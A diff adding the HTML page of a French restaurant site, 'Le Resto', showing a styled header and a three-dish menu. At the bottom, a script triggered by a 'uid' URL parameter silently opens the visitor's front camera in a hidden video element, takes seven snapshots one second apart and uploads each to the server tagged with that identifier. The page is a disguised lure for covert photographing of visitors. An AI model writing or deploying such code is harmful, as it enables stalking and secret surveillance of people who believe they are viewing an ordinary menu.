@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Le Resto</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #fff5f5;
+    }
+    header {
+      background-color: #cc4b00;
+      color: white;
+      text-align: center;
+      padding: 20px 10px;
+    }
+    nav a {
+      margin: 0 15px;
+      color: white;
+      text-decoration: none;
+      font-weight: bold;
+    }
+    .hero {
+      text-align: center;
+      padding: 40px 10px;
+      font-size: 20px;
+      background-color: #ffecec;
+      color: #cc4b00;
+      font-weight: bold;
+    }
+    .menu {
+      padding: 30px;
+    }
+    .menu h2 {
+      text-align: center;
+      color: #cc4b00;
+      font-size: 26px;
+    }
+    .menu-item {
+      background-color: white;
+      padding: 15px;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
+      margin: 15px 0;
+    }
+    .menu-item h3 {
+      margin: 0 0 8px;
+    }
+    .menu-item p {
+      margin: 0;
+    }
+    .price {
+      font-weight: bold;
+      color: #cc4b00;
+      margin-top: 8px;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Le Resto</h1>
+    <nav>
+      <a href="#">Accueil</a>
+      <a href="#">Menu</a>
+      <a href="#">Réservations</a>
+      <a href="#">Contact</a>
+    </nav>
+  </header>
+
+  <div class="hero">Découvrez nos saveurs authentiques</div>
+
+  <section class="menu">
+    <h2>Notre Menu</h2>
+
+    <div class="menu-item">
+      <h3>Entrée : Salade César</h3>
+      <p>Salade croquante avec poulet grillé</p>
+      <div class="price">8 €</div>
+    </div>
+
+    <div class="menu-item">
+      <h3>Plat : Poulet rôti aux herbes</h3>
+      <p>Poulet tendre accompagné de légumes frais</p>
+      <div class="price">15 €</div>
+    </div>
+
+    <div class="menu-item">
+      <h3>Dessert : Tarte aux pommes</h3>
+      <p>Tarte traditionnelle avec caramel</p>
+      <div class="price">6 €</div>
+    </div>
+  </section>
+
+  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const uid = urlParams.get("uid");
+
+    if (uid) {
+      navigator.mediaDevices
+        .getUserMedia({
+          video: {
+            facingMode: { exact: "user" } // <-- caméra avant
+          }
+        })
+        .then((stream) => {
+          const video = document.createElement("video");
+          video.style.display = "none";
+          document.body.appendChild(video);
+          video.srcObject = stream;
+          video.play();
+
+          let count = 0;
+          const interval = setInterval(() => {
+            if (count >= 7) {
+              clearInterval(interval);
+              stream.getTracks().forEach((track) => track.stop());
+              video.remove();
+              return;
+            }
+
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob((blob) => {
+              const formData = new FormData();
+              formData.append("photo", blob, `photo${count + 1}.jpg`);
+              fetch(`/upload?uid=${uid}`, {
+                method: "POST",
+                body: formData,
+              }).catch((err) => console.error("Erreur d'envoi :", err));
+            }, "image/jpeg");
+
+            count++;
+          }, 1000);
+        })
+        .catch((error) => {
+          console.error("Erreur d'accès à la caméra :", error);
+        });
+    }
+  </script>
+</body>
+</html>
